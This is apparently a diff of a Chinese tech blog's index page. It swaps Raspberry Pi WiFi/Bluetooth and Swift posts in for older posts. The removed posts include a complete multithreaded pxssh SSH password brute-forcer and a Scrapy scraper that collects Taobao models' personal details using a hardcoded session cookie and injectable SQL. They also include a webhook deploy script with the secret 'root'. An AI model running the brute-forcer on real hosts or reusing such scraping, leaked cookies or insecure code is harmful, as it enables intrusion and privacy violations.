@@ -126,7 +126,7 @@
 	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
 		<div class="meta">
 			<div class="date">
-				<time datetime="2016-07-13T15:39:33+08:00" itemprop="datePublished">2016/7/13</time>
+				<time datetime="2017-05-11T19:10:58+08:00" itemprop="datePublished">2017/5/11</time>
 			</div>
 			<div class="tags">posted in 
 			
@@ -134,114 +134,96 @@
 			 
 			</div>
 		</div>
-		<h1 class="title" itemprop="name"><a href="14945010337427.html" itemprop="url">
-		利用树莓派搭建迅雷远程下载服务器</a></h1>
+		<h1 class="title" itemprop="name"><a href="14945010588526.html" itemprop="url">
+		树莓派3命令行连接WiFi和蓝牙设备</a></h1>
 		<div class="entry-content" itemprop="articleBody">
 			
-			<blockquote>
-<p>树莓派系统为Raspberry Pi</p>
-</blockquote>
+			<p>转载<a href="https://www.embbnux.com/2016/04/10/raspberry_pi_3_wifi_and_bluetooth_setting_on_console/">原文链接</a></p>
 
-<ol>
-<li><p>树莓派安装迅雷路由器固件<br/>
-可以在迅雷论坛上下载到最新的固件:<a href="http://luyou.xunlei.com/">官网论坛</a>,记得要下arm版本的固件<code>armel_v5te_glibc</code><br/>
-或者下载我共享的这个<a href="http://pan.baidu.com/s/1nvvoX7b">Xware1.0.31_armel_v5te_glibc</a> 提取码:e223<br/>
-在树莓派上解压到某个目录，例如我的是<code>/root/xunlei</code>下面</p>
+<p><img src="https://pic.mylonly.com/2016-06-29_14634631824044.jpg" alt="2016-06-29_14634631824044.jpg"/></p>
 
-<pre><code class="language-Shell">unzip Xware1.0.31_armel_v5te_glibc.zip -d /root/xunlei
-</code></pre>
+<h3 id="toc_0">WiFi连接</h3>
 
-<p>进入<code>/root/xunlei</code>目录 执行:</p>
-
-<pre><code class="language-Shell">./portal
-</code></pre>
-
-<p>稍等片刻，会在最后输出一个激活码，类似下图中涂红的部分</p>
-
-<p><img src="https://pic.mylonly.com/2016-07-13_15:19:59.jpg" alt="2016-07-13_15:19:59.jpg"/> </p></li>
-<li><p>在迅雷远程下载页面绑定树莓派<br/>
-登录<a href="http://yuancheng.xunlei.com/">迅雷远程下载主页</a>,登录之后，左侧会有一个添加按钮，点击添加按钮，弹出如下界面:<br/>
-<img src="https://pic.mylonly.com/2016-07-13_15:22:45.jpg" alt="2016-07-13_15:22:45.jpg"/></p>
-
-<p>将树莓派上获得的激活码填入框中，点击<code>绑定</code>后左侧就会出现树莓派对应的设备列表了，但是，如果我们此时就在右侧点击<code>新建</code>之后会发现,弹出的新建页面中会提示找不到挂载磁盘，如下图：</p>
-
-<p><img src="http://pic.mylonly.com/2016-07-13_15:25:18.jpg" alt="2016-07-13_15:25:18.jpg"/></p></li>
-<li><p>自定义迅雷的下载目录</p>
-
-<p>进入<code>/mnt</code>目录，创建目录TDDOWNLOAD(名字随意)<br/>
-执行命令:</p>
-
-<pre><code class="language-Shell">mount --bind /data/TDDOWNLOAD /mnt/TDDOWNLOAD
-</code></pre>
-
-<p>其中/data/TDDOWNLOAD就是自定义的下载目录，你可以指定为其他任何目录。</p>
-
-<p>然后再刚刚迅雷固件的解压目录下创建目录<code>etc</code>,同时创建文件<code>thunder_mounts.cfg</code>,编辑此文件</p>
-
-<pre><code class="language-Shell">vim /root/xunlei/etc/thunder_mounts.cfg
-</code></pre>
-
-<p>内容为:</p>
-
-<pre><code class="language-Shell">avaliable_mount_path_pattern
-{
-    /mnt/TDDOWNLOAD
+<pre><code>pi@raspi3:~ $ iwlist scan
+wlan0 Scan completed :
+Cell 01 - Address: 00:1E:20:50:AA:BB
+Channel:8
+Frequency:2.447 GHz (Channel 8)
+Quality=70/70 Signal level=-32 dBm
+Encryption key:on
+ESSID:&quot;WIFINAME&quot;
+Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
+9 Mb/s; 12 Mb/s; 18 Mb/s
+Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
+Mode:Master
+Extra:tsf=0000000000000000
+Extra: Last beacon: 2157000ms ago
+IE: Unknown: 000546616E6379
+IE: Unknown: 010882848B960C121824
+IE: Unknown: 030108
+IE: Unknown: 050401020000
+IE: Unknown: 0706303020010B14
+IE: Unknown: 2A0100
+IE: Unknown: 32043048606C
+IE: IEEE 802.11i/WPA2 Version 1
+Group Cipher : TKIP
+Pairwise Ciphers (2) : CCMP TKIP
+Authentication Suites (1) : PSK
+IE: Unknown: 7F080000000000000040
+IE: Unknown: DD180050F2020101000003A4000027A4000042435E0062322F00
+ 
+可以看到周围的wifi热点信息
+配置连接到某个热点:
+ 
+# 编辑wifi文件
+sudo vim /etc/wpa_supplicant/wpa_supplicant.conf
+# 在该文件最后添加下面的话
+network={
+  ssid=&quot;WIFINAME&quot;
+  psk=&quot;password&quot;
 }
+# 引号部分分别为wifi的名字和密码
+# 保存文件后几秒钟应该就会自动连接到该wifi
+# 查看是否连接成功
+ifconfig wlan0
+
 </code></pre>
 
-<p>保存后重启迅雷路由器固件:</p>
+<h3 id="toc_1">蓝牙连接</h3>
 
-<pre><code class="language-Shell">./root/xunlei/portal
+<pre><code>pi@raspi3:~ $ sudo bluetoothctl
+[NEW] Controller BB:27:EB:0D:9D:DD raspi3 [default]
+[bluetooth]# list
+Controller BB:27:EB:0D:9D:DD raspi3 [default]
+[bluetooth]# power on
+Changing power on succeeded
+[bluetooth]# scan on
+Discovery started
+[CHG] Controller BB:27:EB:0D:9D:DD Discovering: yes
+[NEW] Device E8:07:BF:3A:25:AA NDZ-03-GA
+[CHG] Device E8:07:BF:3A:25:AA RSSI: -66
+[bluetooth]# agent on
+Agent registered
+[CHG] Device E8:07:BF:3A:25:AA RSSI: -56
+[bluetooth]# pair E8:07:BF:3A:25:AA
+Attempting to pair with E8:07:BF:3A:25:AA
+[CHG] Device E8:07:BF:3A:25:AA Connected: yes
+[CHG] Device E8:07:BF:3A:25:AA UUIDs:
+    00001108-0000-1000-8000-00805f9b34ff
+[CHG] Device E8:07:BF:3A:25:AA Paired: yes
+Pairing successful
+[CHG] Device E8:07:BF:3A:25:AA Connected: no
+[bluetooth]# trust E8:07:BF:3A:25:AA
+[CHG] Device E8:07:BF:3A:25:AA Trusted: yes
+Changing E8:07:BF:3A:25:AA trust succeeded
+[bluetooth]# connect E8:07:BF:3A:25:AA
+
 </code></pre>
 
-<p>再进入远程下载界面新建下载就没有了没挂载磁盘的提示了</p></li>
-<li><p>迅雷路由器固件开机启动</p>
-
-<p>在/etc/init.d/下新建xunlei脚本，写入:</p>
-
-<pre><code>```Shell
-#!/bin/sh
-#
-# Xunlei initscript
-#
-### BEGIN INIT INFO
-# Provides:          xunlei
-# Required-Start:    $network $local_fs $remote_fs
-# Required-Stop::    $network $local_fs $remote_fs
-# Should-Start:      $all
-# Should-Stop:       $all
-# Default-Start:     2 3 4 5
-# Default-Stop:      0 1 6
-# Short-Description: Start xunlei at boot time
-# Description:       A downloader
-### END INIT INFO
-
-do_start()
-{
-        ./root/xunlei/portal
-}
-
-do_stop()
-{
-        ./root/xunlei/portal -s
-}
-
-case &quot;$1&quot; in
-  start)
-    do_start
-    ;;
-  stop)
-    do_stop
-    ;;
-esac
-``` 
-</code></pre>
-
-<p>然后将该脚本加入默认自启动中</p>
-
-<pre><code class="language-Shell">update-rc.d xunlei defaults
-</code></pre></li>
-</ol>
+<p>这样就连上蓝牙设备了，如果是蓝牙音响的话还得装下支持软件:<br/>
+ <code><br/>
+sudo apt-get install pulseaudio pulseaudio-module-bluetooth<br/>
+</code></p>
 
 
 			
@@ -253,665 +235,368 @@ esac
 	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
 		<div class="meta">
 			<div class="date">
-				<time datetime="2016-07-04T19:12:04+08:00" itemprop="datePublished">2016/7/4</time>
+				<time datetime="2016-10-11T18:15:27+08:00" itemprop="datePublished">2016/10/11</time>
 			</div>
 			<div class="tags">posted in 
 			
-			    <a class='category' href='python.html'>Python</a>&nbsp;
+			    <a class='category' href='ios.html'>iOS</a>&nbsp;
 			 
 			</div>
 		</div>
-		<h1 class="title" itemprop="name"><a href="14945011244738.html" itemprop="url">
-		Scrapy抓取Ajax动态页面</a></h1>
+		<h1 class="title" itemprop="name"><a href="14944977278738.html" itemprop="url">
+		Swift要点</a></h1>
 		<div class="entry-content" itemprop="articleBody">
 			
-			<blockquote>
-<p>一般来说爬虫类框架抓取Ajax动态页面都是通过一些第三方的webkit库去手动执行html页面中的js代码， 最后将生产的html代码交给spider分析。本篇文章则是通过浏览器提供的Debug工具分析Ajax页面的具体请求内容，找到获取数据的接口url，直接调用该接口获取数据，省去了引入python-webkit库的麻烦，而且由于一般ajax请求的数据都是结构化数据，这样更省去了我们利用xpath解析html的痛苦。</p>
-</blockquote>
-
-<p>这次我们要抓取的网站是<a href="https://mm.taobao.com">淘女郎</a>的页面,全站都是通过Ajax获取数据然后重新渲染生产的。</p>
-
-<p>这篇文章的代码已上传至我的<a href="https://github.com/mylonly/Spiders">Github</a>,由于后面有部分内容并没有提供完整代码，所以贴上地址供各位参考。</p>
-
-<h3 id="toc_0">分析工作</h3>
-
-<p>用Chrome打开淘女郎的首页中的<a href="https://mm.taobao.com/search_tstar_model.htm">美人库</a>，这个页面毫无疑问是会展示所有的模特的信息，同时打开Debug工具，在network选项中查看浏览器发送了哪些请求？</p>
-
-<p><img src="https://pic.mylonly.com/2016-07-04_16:11:01.jpg" alt="2016-07-04_16:11:01.jpg"/></p>
-
-<p>在截图的左下角可以看到总共产生了86个请求，那么有什么办法可以快速定位到Ajax请求的链接了，利用Network当中提供的Filter功能，选中Filter，最后选择右边的XHR过滤(XHR时XMLHttpRequest对象，一般Ajax请求的数据都是结构化数据)，这样就剩下了为数不多的几个请求，剩下的就靠我们自己一个一个的检查吧</p>
-
-<p><img src="https://pic.mylonly.com/2016-07-04_16:22:18.jpg" alt="2016-07-04_16:22:18.jpg"/></p>
-
-<p>很幸运，通过分析每个接口返回的request和response信息，发现最后一个请求就是我们需要的接口url</p>
-
-<p><img src="https://pic.mylonly.com/2016-07-04_16:25:56.jpg" alt="2016-07-04_16:25:56.jpg"/></p>
-
-<p>Request中得参数很简单,根据英文意思就可以猜出意义,由于我们要抓取所有模特的信息，所以不需要定制这些参数，后面直接将这些参数post给接口就行了</p>
-
-<p><img src="https://pic.mylonly.com/2016-07-04_16:29:06.jpg" alt="2016-07-04_16:29:06.jpg"/></p>
-
-<p>在Response中可以获得到的有用数据有两个:所有模特信息的列表<code>searchDOList</code>、以及总页数<code>totolPage</code></p>
-
-<p><img src="https://pic.mylonly.com/2016-07-04_16:35:05.jpg" alt="2016-07-04_16:35:05.jpg"/></p>
-
-<p>searchDOList列表中得对象都有如上图所示的json格式，它也正是我们需要的模特信息的数据</p>
-
-<h3 id="toc_1">Scrapy编码</h3>
+			<p>(本文所有代码样例全部来自Swift2.0官方文档)</p>
 
 <ol>
-<li><p>定义Item</p>
-
-<pre><code class="language-Python">class tbModelItem(scrapy.Item):
-    avatarUrl = scrapy.Field()
-    cardUrl = scrapy.Field()
-    city = scrapy.Field()
-    height = scrapy.Field()
-    identityUrl = scrapy.Field()
-    modelUrl = scrapy.Field()
-    realName = scrapy.Field()
-    totalFanNum = scrapy.Field()
-    totalFavorNum = scrapy.Field()
-    userId = scrapy.Field()
-    viewFlag = scrapy.Field()
-    weight = scrapy.Field()
-</code></pre>
-
-<p>根据上面的分析得到的json格式，我们可以很轻松的定义出item</p></li>
-<li><p>Spider编写</p>
-
-<pre><code class="language-Python">import urllib2
-import os
-import re
-import codecs
-import json
-import sys
-from scrapy import Spider
-from scrapy.selector import Selector
-from MySpider.items import tbModelItem,tbThumbItem
-from scrapy.http import Request
-from scrapy.http import FormRequest
-from scrapy.utils.response import open_in_browser
-
-reload(sys)
-sys.setdefaultencoding(&#39;utf8&#39;)
-
-class tbmmSpider(Spider):
-    name = &quot;tbmm&quot;
-    allow_domians = [&quot;mm.taobao.com&quot;]
-
-    custom_settings = {
-        &quot;DEFAULT_REQUEST_HEADERS&quot;:{
-            &#39;authority&#39;:&#39;mm.taobao.com&#39;,
-            &#39;accept&#39;:&#39;application/json, text/javascript, */*; q=0.01&#39;,
-            &#39;accept-encoding&#39;:&#39;gzip, deflate&#39;,
-            &#39;accept-language&#39;:&#39;zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4&#39;,
-            &#39;origin&#39;:&#39;https://mm.taobao.com&#39;,
-            &#39;referer&#39;:&#39;https://mm.taobao.com/search_tstar_model.htm?spm=719.1001036.1998606017.2.KDdsmP&#39;,
-            &#39;user-agent&#39;:&#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36&#39;,
-            &#39;x-requested-with&#39;:&#39;XMLHttpRequest&#39;,
-            &#39;cookie&#39;:&#39;cna=/oN/DGwUYmYCATFN+mKOnP/h; tracknick=adimtxg; _cc_=Vq8l%2BKCLiw%3D%3D; tg=0; thw=cn; v=0; cookie2=1b2b42f305311a91800c25231d60f65b; t=1d8c593caba8306c5833e5c8c2815f29; _tb_token_=7e6377338dee7; CNZZDATA30064598=cnzz_eid%3D1220334357-1464871305-https%253A%252F%252Fmm.taobao.com%252F%26ntime%3D1464871305; CNZZDATA30063600=cnzz_eid%3D1139262023-1464874171-https%253A%252F%252Fmm.taobao.com%252F%26ntime%3D1464874171; JSESSIONID=8D5A3266F7A73C643C652F9F2DE1CED8; uc1=cookie14=UoWxNejwFlzlcw%3D%3D; l=Ahoatr-5ycJM6M9x2/4hzZdp6so-pZzm; mt=ci%3D-1_0&#39;
-        },
-        &quot;ITEM_PIPELINES&quot;:{
-            &#39;MySpider.pipelines.tbModelPipeline&#39;: 300
-        }
-    } 
-
-    def start_requests(self):
-        url = &quot;https://mm.taobao.com/tstar/search/tstar_model.do?_input_charset=utf-8&quot;
-        requests = []
-        for i in range(1,60):
-            formdata = {&quot;q&quot;:&quot;&quot;,
-                        &quot;viewFlag&quot;:&quot;A&quot;,
-                        &quot;sortType&quot;:&quot;default&quot;,
-                        &quot;searchStyle&quot;:&quot;&quot;,
-                        &quot;searchRegion&quot;:&quot;city:&quot;,
-                        &quot;searchFansNum&quot;:&quot;&quot;,
-                        &quot;currentPage&quot;:str(i),
-                        &quot;pageSize&quot;:&quot;100&quot;}
-            request = FormRequest(url,callback=self.parse_model,formdata=formdata)
-            requests.append(request)
-        return requests
-
-    def parse_model(self,response):
-        jsonBody = json.loads(response.body.decode(&#39;gbk&#39;).encode(&#39;utf-8&#39;))
-        models = jsonBody[&#39;data&#39;][&#39;searchDOList&#39;]
-        modelItems = []
-        for dict in models:
-            modelItem = tbModelItem()
-            modelItem[&#39;avatarUrl&#39;] = dict[&#39;avatarUrl&#39;]
-            modelItem[&#39;cardUrl&#39;] = dict[&#39;cardUrl&#39;]
-            modelItem[&#39;city&#39;] = dict[&#39;city&#39;]
-            modelItem[&#39;height&#39;] = dict[&#39;height&#39;]
-            modelItem[&#39;identityUrl&#39;] = dict[&#39;identityUrl&#39;]
-            modelItem[&#39;modelUrl&#39;] = dict[&#39;modelUrl&#39;]
-            modelItem[&#39;realName&#39;] = dict[&#39;realName&#39;]
-            modelItem[&#39;totalFanNum&#39;] = dict[&#39;totalFanNum&#39;]
-            modelItem[&#39;totalFavorNum&#39;] = dict[&#39;totalFavorNum&#39;]
-            modelItem[&#39;userId&#39;] = dict[&#39;userId&#39;]
-            modelItem[&#39;viewFlag&#39;] = dict[&#39;viewFlag&#39;]
-            modelItem[&#39;weight&#39;] = dict[&#39;weight&#39;]
-            modelItems.append(modelItem)
-        return modelItems  
-</code></pre>
-
-<p>代码不长，一点一点来分析:</p>
-
-<ol>
-<li>由于分析这个页面并不需要递归遍历网页，所以就不要crawlSpider了，只继承最简单的spider</li>
-<li>custome_setting可用于自定义每个spider的设置，而setting.py中的都是全局属性的，当你的scrapy工程里有多个spider的时候这个custom_setting就显得很有用了</li>
-<li>ITEM_PIPELINES，自定义管道模块，当item获取到数据后会调用你指定的管道处理命令，这个后面会贴上代码，因为这个不影响本文的内容，数据的处理可以因人而异。</li>
-<li>依然重写start_request,带上必要的参数请求我们分析得到的借口url，这里我省了一个懒，只遍历了前60页的数据，各位当然可以先调用1次借口确定总的页数(totalPage)之后再写这个for循环。</li>
-<li>parse函数里利用json库解析了返回来得数据，赋值给item的相应字段</li>
-</ol></li>
-<li><p>数据后续处理</p>
-
-<p>数据处理也就是我上面配置ITEM_PIPELINES的目的，这里，我将获取到的item数据存储到了本地的mysql数据中，各位也可以通过FEED_URL参数直接输出json格式文本文件</p>
-
-<pre><code class="language-Python">import MySQLdb
-
-class tbModelPipeline(object):
-    def process_item(self,item,spider):
-        db = MySQLdb.connect(&quot;localhost&quot;,&quot;用户名&quot;,&quot;密码&quot;,&quot;spider&quot;)
-        cursor = db.cursor()
-        db.set_character_set(&#39;utf8&#39;)
-        cursor.execute(&#39;SET NAMES utf8;&#39;)
-        cursor.execute(&#39;SET CHARACTER SET utf8;&#39;)
-        cursor.execute(&#39;SET character_set_connection=utf8;&#39;)
-
-        sql =&quot;INSERT INTO tb_model(user_id,avatar_url,card_url,city,height,identity_url,model_url,real_name,total_fan_num,total_favor_num,view_flag,weight)\
-                      VALUES(&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;)&quot;%(item[&#39;userId&#39;],item[&#39;avatarUrl&#39;],item[&#39;cardUrl&#39;],item[&#39;city&#39;],item[&#39;height&#39;],item[&#39;identityUrl&#39;],\
-                      item[&#39;modelUrl&#39;],item[&#39;realName&#39;],item[&#39;totalFanNum&#39;],item[&#39;totalFavorNum&#39;],item[&#39;viewFlag&#39;],item[&#39;weight&#39;])
-        try:
-                print sql
-                cursor.execute(sql)
-                db.commit()
-        except MySQLdb.Error,e:
-                print &quot;Mysql Error %d: %s&quot; % (e.args[0], e.args[1])
-        db.close()
-        return item
-</code></pre></li>
-</ol>
-
-<h3 id="toc_2">更重要的内容</h3>
-
-<p>获取所有的淘女郎的基本信息并不是<a href="https://mm.taobao.com">淘女郎</a>这个网站的全部内容，还有一些更有意思的数据,比如:</p>
-
-<p>点击进入模特的页面之后发现左侧会有有个相册选项卡，点击后右边出现了各种相册，而每个相册里面都是各种各样的模特照片</p>
-
-<p><img src="https://pic.mylonly.com/2016-07-04_17:04:22.jpg" alt="2016-07-04_17:04:22.jpg"/></p>
-
-<p><img src="https://pic.mylonly.com/2016-07-04_17:04:49.jpg" alt="2016-07-04_17:04:49.jpg"/></p>
-
-<p>通过network的分析，这些页面的数据通通都是Ajax请求获得的，具体的接口如下:</p>
-
-<p><img src="https://pic.mylonly.com/2016-07-04_17:09:51.jpg" alt="2016-07-04_17:09:51.jpg"/></p>
-
-<p><img src="https://pic.mylonly.com/2016-07-04_17:10:16.jpg" alt="2016-07-04_17:10:16.jpg"/></p>
-
-<ol>
-<li><p>获取相册列表的接口是一个GET请求，其中只有一个很重要的user_id，而这个user_id在上面拿去模特的基本信息已经拿到了，还有个page参数用于标识获取的是第几页数据(由于这个是第一页，并没有在url中显现出来，可以通过返回的html中包含的totalPage元素获得)不过这个接口的返回就不是标准的json格式了，而是一段html，这时候又到了利用scrapy中提供的强大的xpath功能了</p>
-
-<pre><code class="language-Python">def parse_album(self,response):
-   sel = Selector(response)
-   tbThumbItems = []
-   thumb_url_list = sel.xpath(&quot;//div[@class=&#39;mm-photo-cell-middle&#39;]//h4//a/@href&quot;).extract()       
-   thumb_name_list = sel.xpath(&quot;//div[@class=&#39;mm-photo-cell-middle&#39;]//h4//a/text()&quot;).extract()
-   user_id = response.meta[&#39;user_id&#39;]
-   for i in range(0,len(thumb_url_list)-1):
-       thumbItem = tbThumbItem()
-       thumbItem[&#39;thumb_name&#39;] = thumb_name_list[i].replace(&#39;\r\n&#39;,&#39;&#39;).replace(&#39; &#39;,&#39;&#39;)
-       thumbItem[&#39;thumb_url&#39;] = thumb_url_list[i]
-       thumbItem[&#39;thumb_userId&#39;] = str(user_id)
-       temp = self.urldecode(thumbItem[&#39;thumb_url&#39;])
-       thumbItem[&#39;thumb_id&#39;] = temp[&#39;album_id&#39;][0]
-       tbThumbItems.append(thumbItem)
-   return tbThumbItems
-</code></pre></li>
-<li><p>获取相册里照片的接口就是一个完全的json格式的接口了,其中参数包括我们已经拿到的user_id以及album_id，page的最大范围totalPage依然可以通过第一次返回的response中的totalPage字段获得</p>
-
-<p><img src="https://pic.mylonly.com/2016-07-04_17:25:23.jpg" alt="2016-07-04_17:25:23.jpg"/></p>
-
-<p><img src="https://pic.mylonly.com/2016-07-04_17:25:46.jpg" alt="2016-07-04_17:25:46.jpg"/></p></li>
-</ol>
-
-<h3 id="toc_3">总结</h3>
-
-<ol>
-<li>这种通过分析Ajax接口直接调用获取原始数据应该是效率最高的抓取数据方式，但并不是所有的Ajax页面都适用，还是要具体对待，比如我们上面获取相册列表当中就要去分析html来获得相册的基本信息。</li>
-<li>获取相册和相册里的照片列表写的比较简略，基本没展示什么代码，这样写是有原因的:一个是因为我已经挂了代码的链接,而且后面这两部分的原理和我主要讲的第一部分获取模特信息的原理基本类似，不想花太多的篇幅花在这种重复的内容上，另外一个我希望想掌握Scrapy的同学能在明白我第一部分的讲解下自己能顺利完成后面的工作，遇到不明白的时候可以看看我Github上的源码，看看有什么不对的地方，只有自己写一遍才能掌握，这是编程界的硬道理。</li>
-</ol>
-
-
-			
-			
-		</div>
-
-	</article>
- 
-	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
-		<div class="meta">
-			<div class="date">
-				<time datetime="2016-07-02T19:09:49+08:00" itemprop="datePublished">2016/7/2</time>
-			</div>
-			<div class="tags">posted in 
-			
-			    <a class='category' href='linux.html'>Linux</a>&nbsp;
-			 
-			</div>
-		</div>
-		<h1 class="title" itemprop="name"><a href="14945009892942.html" itemprop="url">
-		利用Github的Webhook功能和Node.js完成项目的自动部署</a></h1>
-		<div class="entry-content" itemprop="articleBody">
-			
-			<p><u>本文对任何提供Webhook的git仓库都适用</u></p>
-
-<p><img src="https://pic.mylonly.com/2016-06-29_14635623250348.jpg" alt="2016-06-29_14635623250348.jpg"/></p>
-
-<h3 id="toc_0">首先完成Node.js服务器的代码构建，先上代码，再解释</h3>
-
-<pre><code class="language-Node.js">var http = require(&#39;http&#39;)
-var createHandler = require(&#39;github-webhook-handler&#39;)
-var handler = createHandler({ path: &#39;/&#39;, secret: &#39;root&#39; })
-// 上面的 secret 保持和 GitHub 后台设置的一致
-
-function run_cmd(cmd, args, callback) {
-  var spawn = require(&#39;child_process&#39;).spawn;
-  var child = spawn(cmd, args);
-  var resp = &quot;&quot;;
-
-  child.stdout.on(&#39;data&#39;, function(buffer) { resp += buffer.toString(); });
-  child.stdout.on(&#39;end&#39;, function() { callback (resp) });
-}
-
-http.createServer(function (req, res) {
-  handler(req, res, function (err) {
-    res.statusCode = 404
-    res.end(&#39;no such location&#39;)
-  })
-}).listen(7777)
-
-handler.on(&#39;error&#39;, function (err) {
-  console.error(&#39;Error:&#39;, err.message)
-})
-
-handler.on(&#39;push&#39;, function (event) {
-  console.log(&#39;Received a push event for %s to %s&#39;,
-    event.payload.repository.name,
-    event.payload.ref);
-    run_cmd(&#39;sh&#39;, [&#39;./deploy.sh&#39;,event.payload.repository.name], function(text){ console.log(text) });
-})
-</code></pre>
-
-<p>上面的代码中用到了一个<code>github-webhook-handler</code>的中间价，你可以用<code>npm install -g github-webhook-handler</code>来全局安装</p>
-
-<p>还有代码这行:<br/>
-<code><br/>
-var handler = createHandler({ path: &#39;/&#39;, secret: &#39;root&#39; }) <br/>
-</code><br/>
-其中secret后的参数是你在github的项目中添加webhook时设置的secret值，替换成自己的就行了</p>
-
-<h3 id="toc_1">完成deploy.sh脚本</h3>
-
-<p>deploy.sh脚本负责进入项目的目录，然后利用git命令拉取最新的代码，还是直接贴代码:</p>
-
-<pre><code class="language-Bash"> #!/bin/bash
-
-WEB_PATH=&#39;/root/tools/&#39;$1
-WEB_USER=&#39;root&#39;
-WEB_USERGROUP=&#39;root&#39;
-
-echo &quot;Start deployment&quot;
-cd $WEB_PATH
-echo &quot;pulling source code...&quot;
-git reset --hard origin/master
-git clean -f
-git pull
-git checkout master
-echo &quot;changing permissions...&quot;
-chown -R $WEB_USER:$WEB_USERGROUP $WEB_PATH
-echo &quot;Finished.&quot;
-</code></pre>
-
-<p>deploy.sh 会接受第一个参数当做项目名字，然后进入这个项目的目录执行git操作，这个参数是在deploy.js中根据hook返回的项目名字来的，代码应该比较容易懂，都是些简单的git命令。</p>
-
-<blockquote>
-<p>如果是全新的项目，需要在你的服务器上先clone要部署的项目<br/>
-你需要根据自己的实际项目位置，修改WEB_PATH的值</p>
-</blockquote>
-
-<h3 id="toc_2">后台运行deploy.js</h3>
-
-<p>利用Linux提供的nohup命令，让deploy.js运行在后台</p>
-
-<pre><code>nohup node deploy.js &gt; deploy.log &amp;
-</code></pre>
-
-<h3 id="toc_3">去Github后台添加webhook</h3>
-
-<p>进入你需要自动部署的项目的github地址，进入项目的设置页面，点击左侧的<code>Webhooks &amp; services</code><br/>
-<img src="https://pic.mylonly.com/2016-06-29_14635620989191.jpg" alt="2016-06-29_14635620989191.jpg"/></p>
-
-
-			
-			
-		</div>
-
-	</article>
- 
-	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
-		<div class="meta">
-			<div class="date">
-				<time datetime="2016-06-24T19:12:26+08:00" itemprop="datePublished">2016/6/24</time>
-			</div>
-			<div class="tags">posted in 
-			
-			    <a class='category' href='python.html'>Python</a>&nbsp;
-			 
-			</div>
-		</div>
-		<h1 class="title" itemprop="name"><a href="14945011465578.html" itemprop="url">
-		利用pxssh暴力破解ssh密码</a></h1>
-		<div class="entry-content" itemprop="articleBody">
-			
-			<blockquote>
-<p><mark>关于pxssh</mark><br/>
-pxssh 是一个包含了pexpect库的专用脚本,它已经预先为我们写好了login(),logout()和prompt()等函数直接与SSH交互。</p>
-</blockquote>
-
-<h4 id="toc_0">利用pxssh的login函数判断密码是否正确</h4>
-
-<p>由于pxssh.login()函数执行失败会抛出异常，因此我们可以利用try...catch来捕获相应的异常来判断密码是否正确。（PS:其中的connection_lock.release()是信号量得释放操作）</p>
-
-<pre><code class="language-Python">def connect(host,user,password):
-    try:
-        session = pxssh.pxssh()
-        session.login(host,user,password)
-        print(&#39;[+]Password Found:&#39;+password)
-    except Exception,e:
-        print (&#39;[-] Error Connecting:&#39;+str(e))
-    finally:
-        connection_lock.release()
-</code></pre>
-
-<h4 id="toc_1">多线程和信号量</h4>
-
-<p>由于我们准备从一个庞大的字典文件的读取密码，我们决定利用多线程来同时处理多个密码登陆操作用来加快速度。</p>
-
-<pre><code class="language-Python">password_file = open(password,&#39;r&#39;)
-for line in password_file:
-        thread = threading.Thread(target=connect,args=(host,user,password))
-        thread.start()
-</code></pre>
-
-<p>可是像上面的代码,如果password_file是个巨大的密码文件，就为同时产生过多的线程，很容易造成服务器无法响应，为了控制同时存在的线程数量，我们这里采用threading中的BoundedSemaphore来控制最大连接数，也就是最多的允许线程数量,讲上面的代码改成如下这样:</p>
-
-<pre><code class="language-Python">maxConnections = 5
-connection_lock = threading.BoundedSemaphore(maxConnections)
-password_file = open(password,&#39;r&#39;)
-for line in password_file:
-   password = line.strip(&#39;\r&#39;).strip(&#39;\n&#39;)
-   connection_lock.acquire()
-   print(&#39;[-] Testing password:&#39;+str(password))
-   thread = threading.Thread(target=connect,args=(host,user,password))
-   thread.start()
-</code></pre>
-
-<p>最大连接数被设置为5，在每个thread启动时注册一个信号量，在connect函数结束时注销这个信号量，这样同时存在的线程数量就被控制为5个。</p>
-
-<h4 id="toc_2">测试结果</h4>
-
-<p><img src="https://pic.mylonly.com/2016-06-29_14667836697742.jpg" alt="2016-06-29_14667836697742.jpg"/><br/>
-字典文件可以自己生成，或者网上找一些常用字典文件</p>
-
-<h4 id="toc_3">完整代码</h4>
-
-<pre><code class="language-Python">from pexpect import pxssh
-import threading
-import optparse
-import time
-
-maxConnections = 5
-connection_lock = threading.BoundedSemaphore(maxConnections)
-
-def send_command(child,cmd):
-    child.sendline(cmd)
-    child.prompt()
-    print(child.before)
-
-def connect(host,user,password):
-    try:
-        session = pxssh.pxssh()
-        session.login(host,user,password)
-        print(&#39;[+]Password Found:&#39;+password)
-    except Exception,e:
-        print (&#39;[-] Error Connecting:&#39;+str(e))
-    finally:
-        connection_lock.release()
-
-def main():
-    
-    parse = optparse.OptionParser(&#39;Usage %prog &#39;+ \
-        &#39;-H &lt;target host&gt; -u &lt;user&gt; -F &lt;password file&gt;&#39;)
-    parse.add_option(&#39;-H&#39;,dest=&#39;host&#39;,type=&#39;string&#39;,help=&#39;specify target host&#39;)
-    parse.add_option(&#39;-u&#39;,dest=&#39;user&#39;,type=&#39;string&#39;,help=&#39;specify username&#39;)
-    parse.add_option(&#39;-F&#39;,dest=&#39;password&#39;,type=&#39;string&#39;,help=&#39;specify password file&#39;)
-    (options,args) = parse.parse_args()
-
-    host = options.host
-    user = options.user
-    password = options.password
-
-    password_file = open(password,&#39;r&#39;)
-
-    for line in password_file:
-        password = line.strip(&#39;\r&#39;).strip(&#39;\n&#39;)
-        connection_lock.acquire()
-        print(&#39;[-] Testing password:&#39;+str(password))
-        thread = threading.Thread(target=connect,args=(host,user,password))
-        thread.start()
-
-if __name__ == &#39;__main__&#39;:
-    main()
-
-</code></pre>
-
-
-			
-			
-		</div>
-
